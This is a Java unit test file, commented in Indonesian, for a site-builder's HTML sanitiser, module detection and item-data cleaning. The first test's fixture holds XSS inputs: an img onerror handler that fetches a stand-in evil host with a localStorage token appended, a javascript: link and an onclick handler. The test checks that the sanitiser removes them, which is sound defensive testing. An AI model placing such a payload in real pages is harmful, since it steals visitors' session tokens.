package com.aris.templateapp.site;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.Test;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** Modul dinamis website: pembersihan HTML saat build dan deteksi modul untuk Portal Pengurus. */
class SiteModulesTest {

    @Test
    void buildKeepsModuleAttributesButRemovesScriptHooks() {
        Document doc = Jsoup.parse("""
                <div data-ws-list="pengumuman" data-tpl-id="3"><article data-ws-item><h3 data-ws-field="judul">x</h3></article></div>
                <img src="a.png" onerror="fetch('//jahat?'+localStorage.getItem('t'))">
                <a href=" JaVaScript:alert(1)" data-ws-auth="login">Masuk</a>
                <button onclick="x()" data-ws-auth="logout">Keluar</button>""");

        SiteBuildService.stripMarkingAttributes(doc);
        String html = doc.body().html();

        assertThat(html).contains("data-ws-list=\"pengumuman\"", "data-ws-item", "data-ws-field=\"judul\"",
                "data-ws-auth=\"login\"", "data-ws-auth=\"logout\"");
        assertThat(html).doesNotContain("data-tpl-id", "onerror", "onclick", "javascript:");
    }

    @Test
    void templateModulesListsCollectionsWithFieldTypesExceptNews() {
        Map<String, Map<String, String>> modules = PublicSiteController.templateModules("""
                <div data-ws-list="pengumuman"><div data-ws-item><span data-ws-field="judul"></span></div></div>
                <div data-ws-collection="prestasi"><div data-ws-item>
                  <img data-ws-field="foto"><b data-ws-field="judul"></b><a data-ws-link="link"></a>
                  <p data-ws-field="cerita" data-ws-type="paragraf"></p><time data-ws-field="tanggal" data-ws-type="Tanggal"></time>
                  <span data-ws-field="poin" data-ws-type="angka"></span><i data-ws-field="aneh" data-ws-type="warna"></i></div></div>""");

        assertThat(modules).containsOnlyKeys("prestasi");
        assertThat(modules.get("prestasi")).containsExactly(
                Map.entry("foto", "gambar"), Map.entry("judul", "teks"), Map.entry("link", "link"),
                Map.entry("cerita", "paragraf"), Map.entry("tanggal", "tanggal"), Map.entry("poin", "angka"),
                Map.entry("aneh", "teks"));
    }

    @Test
    void cleanItemDataTrimsDropsBlanksAndRejectsTooLong() {
        Map<String, Object> raw = new java.util.LinkedHashMap<>();
        raw.put(" judul ", "  Juara 1  ");
        raw.put("kosong", "  ");
        raw.put("id", "palsu");
        raw.put("tahun", 2026);

        assertThat(PortalContentController.cleanItemData(raw)).containsExactly(
                Map.entry("judul", "Juara 1"), Map.entry("tahun", "2026"));
        assertThatThrownBy(() -> PortalContentController.cleanItemData(Map.of("kosong", " ")))
                .isInstanceOf(com.aris.templateapp.common.exception.ApiException.class);
        assertThatThrownBy(() -> PortalContentController.cleanItemData(Map.of("cerita", "x".repeat(5001))))
                .isInstanceOf(com.aris.templateapp.common.exception.ApiException.class);
    }
}
